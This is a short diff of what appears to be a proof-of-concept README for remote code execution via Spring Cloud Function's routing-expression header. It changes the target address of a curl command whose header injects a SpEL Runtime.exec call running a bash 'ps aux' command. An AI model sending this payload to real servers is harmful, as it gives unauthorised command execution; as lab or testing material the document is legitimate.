@@ -48,7 +48,7 @@ curl -X POST http://127.0.0.1:8080/functionRouter \
 ### 2. Show Processes
 
 ```bash
-curl -X POST http://192.168.1.6:8079/functionRouter \
+curl -X POST http://127.0.0.1:8080/functionRouter \
   -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{"bash","-c","ps aux>/tmp/ps.txt"})' \
   -d 'Never gonna let you down'
 ```
